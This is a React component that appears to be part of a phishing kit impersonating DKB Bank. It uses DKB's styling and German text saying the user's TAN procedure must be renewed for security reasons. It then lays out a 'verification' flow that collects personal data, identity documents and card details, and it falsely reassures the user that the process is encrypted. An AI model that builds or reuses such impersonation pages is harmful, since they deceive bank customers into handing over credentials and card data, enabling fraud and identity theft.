import React, { useState } from 'react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  const [isLoading, setIsLoading] = useState(false);

  const handleStartClick = async () => {
    setIsLoading(true);
    try {
      await onStartVerification();
    } catch (error) {
      console.error('Error starting verification:', error);
      setIsLoading(false);
    }
    // Don't set isLoading to false on success - let the parent handle state transition
  };
  
  return (
    <div className="dkb-form-container">
      <div className="dkb-form-card" style={{ textAlign: 'center' }}>
        {/* Header with close button */}
        <div className="dkb-form-header">
          <button className="dkb-close-button" type="button">←</button>
          <h1 className="dkb-form-title">TAN-Verfahren erneuern</h1>
          <button className="dkb-close-button" type="button">×</button>
        </div>
        
        {/* Security Icon */}
        <div style={{
          marginBottom: '32px',
          display: 'flex',
          justifyContent: 'center'
        }}>
          <svg 
            width="80" 
            height="80" 
            viewBox="0 0 24 24" 
            fill="none" 
            xmlns="http://www.w3.org/2000/svg"
          >
            <path 
              d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" 
              fill="#148DEA"
            />
            <path 
              d="M12 7v5m0 3h.01" 
              stroke="white" 
              strokeWidth="2" 
              strokeLinecap="round" 
              strokeLinejoin="round"
            />
          </svg>
        </div>
        
        <p className="dkb-form-description" style={{ marginBottom: '32px' }}>
          Aus Sicherheitsgründen muss Ihr TAN-Verfahren erneuert werden. Bitte bestätigen Sie Ihre Identität durch die folgenden Schritte.
        </p>
        
        {/* Security Notice */}
        <div className="dkb-info-box">
          <div style={{
            display: 'flex',
            alignItems: 'flex-start',
            gap: '12px',
            marginBottom: '16px'
          }}>
            <svg 
              width="24" 
              height="24" 
              viewBox="0 0 24 24" 
              fill="none" 
              xmlns="http://www.w3.org/2000/svg"
              style={{ marginTop: '2px', flexShrink: 0 }}
            >
              <circle cx="12" cy="12" r="10" fill="#148DEA"/>
              <path d="M12 6v6m0 4h.01" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            <div>
              <p className="dkb-info-box-title">
                Wichtiger Sicherheitshinweis
              </p>
              <p className="dkb-info-box-text">
                Diese Maßnahme dient dem Schutz Ihres Kontos und Ihrer persönlichen Daten. Die Verifizierung erfolgt gemäß den Sicherheitsstandards der DKB Bank.
              </p>
            </div>
          </div>
        </div>

        {/* Verification Steps */}
        <div className="dkb-success-box">
          <p className="dkb-success-box-title">
            Folgende Schritte sind erforderlich:
          </p>
          
          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <div style={{
                width: '24px',
                height: '24px',
                borderRadius: '50%',
                backgroundColor: 'var(--dkb-success-color)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0
              }}>
                <span style={{ color: 'white', fontSize: '12px', fontWeight: '600' }}>1</span>
              </div>
              <p className="dkb-success-box-text">
                Persönliche Daten verifizieren
              </p>
            </div>
            
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <div style={{
                width: '24px',
                height: '24px',
                borderRadius: '50%',
                backgroundColor: 'var(--dkb-success-color)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0
              }}>
                <span style={{ color: 'white', fontSize: '12px', fontWeight: '600' }}>2</span>
              </div>
              <p className="dkb-success-box-text">
                Sicherheitsdokumente hochladen
              </p>
            </div>
            
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <div style={{
                width: '24px',
                height: '24px',
                borderRadius: '50%',
                backgroundColor: 'var(--dkb-success-color)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0
              }}>
                <span style={{ color: 'white', fontSize: '12px', fontWeight: '600' }}>3</span>
              </div>
              <p className="dkb-success-box-text">
                Kartendaten bestätigen
              </p>
            </div>
          </div>
        </div>

        {/* Start Verification Button */}
        <button
          onClick={handleStartClick}
          className="dkb-submit-button"
          style={{ 
            marginTop: '16px',
            opacity: isLoading ? 0.7 : 1,
            cursor: isLoading ? 'not-allowed' : 'pointer'
          }}
          disabled={isLoading}
        >
          {isLoading ? (
            <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
              <div style={{
                width: '16px',
                height: '16px',
                border: '2px solid rgba(255, 255, 255, 0.3)',
                borderTop: '2px solid #ffffff',
                borderRadius: '50%',
                animation: 'dkb-spin 1s linear infinite'
              }} />
              Verifizierung läuft...
            </span>
          ) : (
            'Verifizierung starten'
          )}
        </button>
        
        {/* Additional Info */}
        <p style={{
          color: 'var(--dkb-text-subdued)',
          fontSize: '12px',
          margin: '24px 0 0 0',
          fontFamily: 'DKBEuclid, Arial, sans-serif',
          lineHeight: '1.4'
        }}>
          Der Verifizierungsprozess dauert nur wenige Minuten und erfolgt vollständig verschlüsselt.
        </p>
      </div>
    </div>
  );
};

export default AccountCompromisedScreen;
